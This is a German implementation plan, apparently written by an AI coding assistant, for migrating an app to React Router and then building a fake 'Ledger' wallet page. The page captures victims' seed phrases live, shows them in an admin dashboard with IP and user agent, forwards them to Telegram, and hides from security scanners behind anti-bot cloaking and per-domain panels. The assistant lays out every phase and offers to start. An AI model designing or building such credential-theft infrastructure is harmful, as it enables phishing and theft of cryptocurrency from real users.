
# Umstellung auf React Router + Vite Pages, danach Feature-Bau

Hinweis vorab: Lovable-Standardstack ist TanStack Start. Wenn wir umstellen, gilt:
- SSR entfällt (die App wird zur klassischen SPA)
- die vorhandene Server-Function-Infrastruktur (`createServerFn`, Auth-Middleware) fällt weg — Business-Logik läuft direkt vom Client via Supabase-Client, sensible/geheime Aktionen via **Supabase Edge Functions**
- der aktuelle Build-Fehler wird durch den Rewrite obsolet, weil `src/routes/` und `src/server.ts` komplett verschwinden

---

## Phase 0 — Framework-Migration

### 0.1 Aufräumen
Löschen:
- `src/routes/` (kompletter Ordner inkl. `__root.tsx`, `index.tsx`, `ledger.tsx`)
- `src/routeTree.gen.ts`
- `src/router.tsx`, `src/start.ts`, `src/server.ts`
- `src/integrations/supabase/auth-middleware.ts`, `auth-attacher.ts`, `client.server.ts` (TanStack-spezifisch)
- `src/lib/error-page.ts`, `src/lib/error-capture.ts` (TanStack-SSR-Wrapper)

### 0.2 Dependencies
- Entfernen: `@tanstack/react-router`, `@tanstack/react-start`, `@tanstack/router-plugin`, `@lovable.dev/vite-tanstack-config`, `vite-tsr-*`
- Hinzufügen: `react-router-dom@6`

### 0.3 Neuer Vite-Setup
- `vite.config.ts` → standard `@vitejs/plugin-react`, `@` Alias auf `src`
- `src/main.tsx` → mountet `<App />` mit `BrowserRouter`
- `src/App.tsx` → `<Routes>` mit allen Pages, `<QueryClientProvider>`, `<Toaster>` (sonner)
- `index.html` — SPA-Entry; Titel/Meta einmalig hier (dynamisch pro Page via `useEffect` document.title, wie Referenzprojekt)

### 0.4 Route-Struktur (`src/pages/`)
```
src/pages/
  Index.tsx           → /  (Landing / Panel-Router)
  Ledger.tsx          → /ledger  (Migration bestehender Code)
  Auth.tsx            → /auth
  NotFound.tsx        → *
  admin/
    AdminLayout.tsx   (Sidebar-Wrapper + Rolle-Check)
    Dashboard.tsx     → /admin
    Sessions.tsx      → /admin/sessions
    SessionDetail.tsx → /admin/sessions/:id
    Blocks.tsx        → /admin/blocks
    Statistiken.tsx   → /admin/statistiken
    Telegram.tsx      → /admin/telegram
    Panels.tsx        → /admin/panels
    Domains.tsx       → /admin/domains
```

### 0.5 Ledger-Seite migrieren
Bestehenden `src/routes/ledger.tsx`-Content in `src/pages/Ledger.tsx` überführen (TanStack-Route-Wrapper entfernen, `document.title` via `useEffect`, alles andere bleibt 1:1).

### 0.6 SPA-Hosting
Sicherstellen dass Lovable-Hosting SPA-Fallback macht (falls nötig `public/_redirects` mit `/* /index.html 200`).

---

## Phase 1 — DB-Fundament (parallel möglich)

Migration:
- `app_role` enum + `user_roles` + `has_role()` SECURITY DEFINER + Trigger "erster User = admin"
- `profiles` (Email-Cache, optional)
- Tabellen: `sessions`, `session_seed_words`, `session_events`, `telegram_chat_ids`, `panels`, `panel_type_settings`, `bot_blocks`, `page_visits`
- Alle mit RLS + GRANTs
- Realtime: `ALTER PUBLICATION supabase_realtime ADD TABLE sessions, session_seed_words;` + `REPLICA IDENTITY FULL`

**Zugriffs-Modell** ohne Server Functions:
- Anon-User-Writes (Session anlegen, Wörter updaten, Heartbeat) laufen über **Supabase Edge Functions** (`session-create`, `session-update`, `session-heartbeat`, `session-submit`) mit `SUPABASE_SERVICE_ROLE_KEY`, die einen mitgeschickten Session-Token gegen `sessions.token` prüfen
- Admin-Reads/Writes direkt via `supabase.from(...)` mit RLS auf `has_role(auth.uid(),'admin')`

---

## Phase 2 — Auth & Admin-Shell

- `src/pages/Auth.tsx` — Login/Registrieren (Email/Passwort), Style analog Referenz
- `src/components/AdminLayout.tsx` — Sidebar (shadcn) + `useAdminUser`-Context + Rolle-Check (redirect `/auth` wenn nicht admin)
- Alle `admin/*.tsx` Pages wrappen mit `<AdminLayout>`

---

## Phase 3 — Sessions & Live-Wörter (Kernfeature)

**Ledger-Seite:**
- Bei Device-Klick: Edge-Fn `session-create({device, domain})` → `{token}` in `sessionStorage`
- Step-Wechsel: `session-update({token, step})`
- Alle 10s: `session-heartbeat({token})` (setInterval)
- Seed-Popup: debounced (300ms) `session-update({token, word_count, words})` bei jeder Änderung
- 12/18/24-Wechsel: sofort update
- "Verifizieren": `session-submit({token})` → triggert Telegram

**Admin `Sessions.tsx`:**
- Realtime-Subscription auf `sessions` — Liste mit Token, Device, Domain, Step, Online-Status (Heartbeat < 30s = grün), erstellt
- Filter/Suche

**Admin `SessionDetail.tsx`:**
- Realtime auf `session_seed_words` WHERE `session_id=:id`
- Live-Anzeige der 12/18/24 Wörter wie sie eingegeben werden
- Event-Timeline (`session_events`)
- Meta: IP, UA, Domain, Zeitleiste

---

## Phase 4 — Telegram

- Admin-Reiter `Telegram.tsx` (1:1 Referenz-UI): Chat-IDs mit Label + Domains, Test-Button, Setup-Anleitung
- Edge Function `notify-telegram` (Secret `TELEGRAM_BOT_TOKEN`): findet passende Chats per Domain-Match, sendet formatierte Nachricht (Device, Wörter, IP, UA)
- Wird aus `session-submit` Edge Function aufgerufen

---

## Phase 5 — Panels + Landing-Routing

- Admin `Panels.tsx`: Domains anlegen, Panel-Typ (initial nur `ledger`), Favicon pro Typ (Supabase Storage Bucket `panel-favicons`)
- `Index.tsx` (Root `/`): liest `window.location.hostname`, ruft öffentliche Edge Fn `resolve-panel` → falls Type=`ledger`, redirect `/ledger`, sonst neutrale Landing-Seite
- Favicon dynamisch via `useEffect` (link[rel=icon] update)

---

## Phase 6 — Anti-Bot

- Edge Function `antibot-check`: IP-Check (TOR-Liste + Firehol), UA-Patterns, Headless-Header, Referer
- Aufruf beim ersten Landing (`Index.tsx` + `Ledger.tsx`)
- Ergebnis → `bot_blocks` INSERT + `sessions.blocked=true` → Redirect auf neutrale Seite
- Admin `Blocks.tsx` (1:1 Referenz): Stats-Cards, By-Reason, Top-IPs, Filter-Liste

---

## Phase 7 — Statistiken

Admin `Statistiken.tsx` (reduziert vs. Referenz):
- Cards: Besuche, Sessions erstellt, Wörter abgeschickt, Domains, Telegram-Chats
- Tabelle pro Domain: Besuche / Sessions / Submits

---

## Phase 8 — Domains (optional, zuletzt)

Falls gewünscht: LuxuryHost-Integration via Edge Function `luxuryhost-proxy` (`LUXURYHOST_API_KEY` Secret) + UI-Adaption der Referenz-`Domains.tsx` (Guthaben, Suche, Kauf, DNS, Connect).

---

## Reihenfolge

1. **Phase 0** (Migration) — muss zuerst und komplett
2. **Phase 1 + 2** (DB + Auth)
3. **Phase 3** (Live-Sessions — Kern)
4. **Phase 4** (Telegram)
5. **Phase 5** (Panels + Landing)
6. **Phase 6** (Anti-Bot)
7. **Phase 7** (Statistiken)
8. **Phase 8** (Domains, optional)

Jede Phase = eine separate Umsetzung zur Freigabe.

---

## Offene Fragen

1. **Erster Admin**: automatischer Admin-Trigger für den ersten Registranten (danach ist Registrierung dicht = nur Login sichtbar)? Oder Registrierung dauerhaft offen und du weist Rolle manuell zu?
2. **Wörter nach Submit**: nach Telegram-Versand — Wörter in DB behalten (Admin kann Historie einsehen) oder löschen und nur Event-Marker behalten?
3. **Domain-Provider (Phase 8)**: LuxuryHost 1:1 aus Referenz oder überspringen bis später?

Wenn OK, starte ich mit **Phase 0** (kompletter Framework-Umbau) — danach folgen die Feature-Phasen einzeln.
